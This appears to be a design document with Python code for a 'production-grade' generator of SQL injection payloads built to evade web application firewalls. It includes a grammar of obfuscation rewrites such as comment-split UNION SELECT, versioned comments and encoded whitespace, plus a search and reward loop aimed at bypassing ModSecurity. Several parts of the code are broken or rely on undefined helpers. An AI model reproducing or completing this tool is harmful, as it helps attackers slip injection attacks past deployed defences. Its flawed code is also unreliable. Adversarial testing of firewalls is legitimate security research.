# SQL-Aware SeqGAN Algorithm Design

## Overview
A production-grade algorithm for generating structurally valid, semantically equivalent, and WAF-evasive SQL injection payloads by combining:
- **SQL-aware tokenization** (semantic units, not characters)
- **Hierarchical AST + Module Locking** (AdvSQLi)
- **Weighted CFG mutation engine** with exponential decay (AdvSQLi)
- **MCTS (UCB1) search** over AST mutations (AdvSQLi, replacing REINFORCE)
- **Sandbox DBMS execution oracle** for semantic validation
- **Multi-level hybrid reward function** (WAF evasion + Execution + Diversity)
- **Family-stratified training** (Boolean, Error, Union, Time)
- **160-token context window** (per transcript guidance)

---

## 1. Tokenization (SQL-Aware)

```python
# Vocabulary units: Keywords, Operators, Delimiters, Functions, Literals, Boundaries
VOCAB = {
    "KEYWORDS": ["SELECT", "UNION", "FROM", "WHERE", "OR", "AND", "INSERT", "UPDATE", "DELETE", "DROP"],
    "OPERATORS": ["=", "!=", "<>", ">", "<", ">=", "<=", "LIKE", "IN", "BETWEEN", "IS", "NOT"],
    "DELIMITERS": ["'", '"', "--", ";", "/*", "*/", "(", ")", ",", "."],
    "FUNCTIONS": ["SLEEP", "WAITFOR", "BENCHMARK", "EXTRACTVALUE", "CONCAT", "VERSION", "USER", "DATABASE"],
    "CONTROL": ["BOUNDARY_L", "BOUNDARY_R", "WHITESPACE", "COMMENT", "INT_LITERAL", "HEX_LITERAL", "STRING_LITERAL"]
}

def sql_aware_tokenize(payload: str) -> List[str]:
    """Use sqlparse to split into semantic tokens."""
    parsed = sqlparse.parse(payload)[0]
    tokens = []
    for token in parsed.flatten():
        ttype = token.ttype
        value = token.value.upper().strip()
        if not value:
            continue
        # Map to vocabulary categories...
        tokens.append(categorize_token(ttype, value))
    return tokens
```

---

## 2. Module Locking & Hierarchical AST

```python
from dataclasses import dataclass
from typing import Optional, List

@dataclass
class SQLiPayload:
    left_boundary: str       # e.g., "'" or '")'
    query_core: "ASTNode"    # Hierarchical AST of the injection core
    right_boundary: str      # e.g., "--+", "#", "/*"

@dataclass
class ASTNode:
    node_type: str           # e.g., "TAUTOLOGY", "UNION_SELECT", "SLEEP_CALL", "COMMENT"
    value: Optional[str]     # Terminal token value (if leaf)
    children: List["ASTNode"]
    non_terminal: bool       # True if expandable via CFG rules
    
    def to_sql(self) -> str:
        """Serialize AST back to SQL string."""
        if self.value:
            return self.value
        return "".join(child.to_sql() for child in self.children)

# Lock boundaries during generation
def lock_boundaries(payload: SQLiPayload) -> SQLiPayload:
    return SQLiPayload(
        left_boundary=payload.left_boundary,  # IMMUTABLE
        query_core=payload.query_core,        # MUTABLE via CFG
        right_boundary=payload.right_boundary # IMMUTABLE
    )
```

---

## 3. Weighted CFG Mutation Engine

```python
from collections import defaultdict
import random

# CFG Production Rules for SQLi Mutations
CFG_RULES = {
    "TAUTOLOGY": [
        ("1=1", 1.0),
        ("2!=3", 1.0),
        ("rand()!=0", 0.5),
        ("(SELECT ORD('r') REGEXP 114)=0x1", 0.25),
    ],
    "DML": [
        ("UNION SELECT", 1.0),
        ("/**/UNION/**/SELECT", 0.5),
        ("/*!UNION*/ /*!50000SELECT*/", 0.25),
        ("OR", 0.7),
        ("||", 0.3),
    ],
    "INTEGER": [
        ("1", 1.0),
        ("0x1", 0.5),
        ("(SELECT 1)", 0.25),
    ],
    "WHITESPACE": [
        (" ", 1.0),
        ("\t", 0.5),
        ("\n", 0.3),
        ("%0A", 0.2),
        ("/**/", 0.1),
    ],
    "COMMENT": [
        ("", 1.0),
        ("/**/", 0.5),
        ("/*foo*/", 0.2),
    ]
}

class WeightedCFGEngine:
    def __init__(self, decay: float = 0.5):
        self.decay = decay
        self.rule_counts = defaultdict(int)  # C[e]
    
    def weight(self, rule_key: str) -> float:
        return self.decay ** self.rule_counts[rule_key]
    
    def select_rule(self, non_terminal: str) -> str:
        candidates = CFG_RULES[non_terminal]
        weights = [self.weight(f"{non_terminal}:{i}") for i in range(len(candidates))]
        total = sum(weights)
        probs = [w / total for w in weights]
        idx = random.choices(range(len(candidates)), weights=probs)[0]
        self.rule_counts[f"{non_terminal}:{idx}"] += 1
        return candidates[idx][0]
    
    def mutate_ast(self, node: ASTNode) -> ASTNode:
        """Recursively apply CFG mutations to expandable non-terminal nodes."""
        if not node.non_terminal:
            return node
        
        # Select a mutation rule for this node type
        new_value = self.select_rule(node.node_type)
        
        # Re-parse new_value into sub-AST (or treat as terminal)
        new_node = parse_to_ast(new_value, node_type=node.node_type)
        new_node.non_terminal = True  # Can be mutated further
        return new_node
```

---

## 4. MCTS Search over AST Mutations (Replaces REINFORCE)

```python
import math
from dataclasses import dataclass, field

@dataclass
class MCTSNode:
    ast: ASTNode
    parent: Optional["MCTSNode"]
    children: List["MCTSNode"] = field(default_factory=list)
    visits: int = 0
    total_reward: float = 0.0
    action_taken: Optional[str] = None  # CFG rule applied to reach this state
    
    def ucb1(self, exploration: float = 1.414) -> float:
        if self.visits == 0:
            return float('inf')
        exploitation = self.total_reward / self.visits
        exploration_term = exploration * math.sqrt(2 * math.log(self.parent.visits) / self.visits)
        return exploitation + exploration_term

class MCTSSearch:
    def __init__(self, cfg_engine: WeightedCFGEngine, reward_fn, max_depth: int = 10):
        self.cfg = cfg_engine
        self.reward_fn = reward_fn
        self.max_depth = max_depth
    
    def select(self, node: MCTSNode) -> MCTSNode:
        while node.children and node.visits > 0:
            node = max(node.children, key=lambda c: c.ucb1())
        return node
    
    def expand(self, node: MCTSNode) -> MCTSNode:
        if node.visits == 0:
            return node
        
        # Apply one CFG mutation to expand
        mutated_ast = self.cfg.mutate_ast(node.ast.query_core)
        new_payload = SQLiPayload(node.ast.left_boundary, mutated_ast, node.ast.right_boundary)
        child = MCTSNode(ast=new_payload, parent=node, action_taken="cfg_mutation")
        node.children.append(child)
        return child
    
    def simulate(self, node: MCTSNode) -> float:
        # Rollout: apply random CFG mutations until complete or max_depth
        current = node.ast
        for _ in range(self.max_depth):
            # Find expandable non-terminals
            expandable = find_non_terminals(current.query_core)
            if not expandable:
                break
            target = random.choice(expandable)
            current = SQLiPayload(
                current.left_boundary,
                self.cfg.mutate_ast(target),
                current.right_boundary
            )
        return self.reward_fn(current)
    
    def backpropagate(self, node: MCTSNode, reward: float):
        while node:
            node.visits += 1
            node.total_reward += reward
            node = node.parent
    
    def search(self, root: MCTSNode, iterations: int = 100) -> ASTNode:
        for _ in range(iterations):
            leaf = self.select(root)
            expanded = self.expand(leaf)
            reward = self.simulate(expanded)
            self.backpropagate(expanded, reward)
        # Return best child by average reward
        return max(root.children, key=lambda c: c.total_reward / c.visits).ast
```

---

## 5. Hybrid Reward Function

```python
from dataclasses import dataclass

@dataclass
class RewardWeights:
    w_waf: float = 0.4
    w_exec: float = 0.3
    w_div: float = 0.3

class HybridReward:
    def __init__(self, weights: RewardWeights, discriminator, sandbox_db, original_payload: SQLiPayload):
        self.w = weights
        self.discriminator = discriminator  # ℓ₁/ℓ∞ regularized linear model
        self.sandbox_db = sandbox_db        # Docker MySQL/PostgreSQL
        self.original = original_payload
    
    def r_waf(self, payload: SQLiPayload) -> float:
        """WAF evasion score: 1 - P(malicious) from discriminator."""
        features = self._extract_features(payload.to_sql())
        p_malicious = self.discriminator.predict_proba(features)[0, 1]
        return 1.0 - p_malicious
    
    def r_exec(self, payload: SQLiPayload) -> float:
        """Execution oracle: sandbox DB validation."""
        try:
            result = self.sandbox_db.execute(payload.to_sql())
            original_result = self.sandbox_db.execute(self.original.to_sql())
            if result == original_result:
                return 1.0
            else:
                return -1.0
        except SQLSyntaxError:
            return -float('inf')  # Hard penalty for syntax errors
    
    def r_div(self, payload: SQLiPayload) -> float:
        """Structural diversity: AST edit distance vs original."""
        return ast_edit_distance(payload.query_core, self.original.query_core)
    
    def __call__(self, payload: SQLiPayload) -> float:
        return (
            self.w.w_waf * self.r_waf(payload) +
            self.w.w_exec * self.r_exec(payload) +
            self.w.w_div * self.r_div(payload)
        )
```

---

## 6. Family-Stratified Training Loop

```python
FAMILIES = ["Boolean", "Error", "Union", "Time"]

def train_family_gan(family: str, real_payloads: List[SQLiPayload], epochs: int = 160):
    """Train one generator per attack family."""
    # 1. MLE Pre-training on family-specific real payloads
    generator = TransformerGenerator(vocab=VOCAB, max_len=160)
    generator.pretrain_mle(real_payloads, epochs=epochs)
    
    # 2. Initialize CFG engine, discriminator, sandbox
    cfg = WeightedCFGEngine(decay=0.5)
    discriminator = L1LInfDiscriminator()  # ModSec-AdvLearn style
    sandbox = SandboxDB()                   # Docker MySQL
    
    # 3. Adversarial training with MCTS
    for epoch in range(100):
        # Sample batch from generator
        generated = generator.sample(batch_size=64)
        
        # For each, run MCTS to find high-reward mutations
        mcts = MCTSSearch(cfg, HybridReward(..., original=real_sample))
        improved = [mcts.search(MCTSNode(g)) for g in generated]
        
        # Update generator via policy gradient on improved samples
        generator.update_policy(improved)
        
        # Periodically retrain discriminator
        if epoch % 10 == 0:
            discriminator.retrain(real_payloads + improved)
    
    return generator
```

---

## 7. Honest Evaluation Protocol

| Metric | Definition | Target |
|--------|------------|--------|
| **Structural Validity Rate** | `sqlparse.parse(payload).valid` | > 95% |
| **Functional Equivalence Rate** | Sandbox DB result matches original | > 90% |
| **WAF Bypass Rate** | HTTP 200 vs ModSecurity+CRS | > 70% |
| **Diversity (AST Edit Distance)** | Mean distance vs training set | > 0.6 |
| **Family Generalization** | Recall on *held-out* families | Measure honestly |

**No HTTP 200 = success claims.** All evaluations must verify actual DB execution.